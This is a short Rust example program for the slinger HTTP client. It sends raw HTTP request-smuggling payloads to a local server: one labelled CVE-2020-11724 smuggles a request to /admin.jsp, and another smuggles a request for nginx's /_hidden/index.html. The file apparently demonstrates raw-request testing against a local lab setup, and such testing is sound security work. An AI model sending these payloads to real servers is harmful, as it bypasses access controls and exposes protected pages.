use slinger::ClientBuilder;

/// CVE-2020-11724
/// when you're using BurpSuite proxy need **disabled** "set **Connection** header on incoming request"
#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
  cve_2020_11724().await;
  nginx().await;
  Ok(())
}

async fn cve_2020_11724() {
  let raw: &str = r#"GET /test1 HTTP/1.1
Host: 192.168.83.196:8081
Content-Length: 42
Transfer-Encoding: chunked

0

GET /test1 HTTP/1.1
Host: 192.168.83.196:8081
X: GET http://192.168.83.1:8080/admin.jsp HTTP/1.0

"#;
  // let proxy = slinger::Proxy::parse("http://127.0.0.1:8080").unwrap();
  let client = ClientBuilder::new().build().unwrap();
  // replace \n to \r\n
  let raw = raw.replace('\n', "\r\n");
  let resp = client
    .raw("http://127.0.0.1:9015/", raw, true)
    .send()
    .await
    .unwrap();
  println!("{:?}", resp.text());
  let command = resp.request().unwrap().get_command();
  println!("{}", command);
}

async fn nginx() {
  let raw = r#"
GET /a HTTP/1.1
Host: localhost
Content-Length: 56

GET /_hidden/index.html HTTP/1.1
Host: notlocalhost


"#;
  let client = ClientBuilder::new().build().unwrap();
  // replace \n to \r\n
  let raw = raw.replace('\n', "\r\n");
  let resp = client
    .raw("http://127.0.0.1:9015/", raw, true)
    .send()
    .await
    .unwrap();
  println!("{:?}", resp.text());
  let command = resp.request().unwrap().get_command();
  println!("{}", command);
}
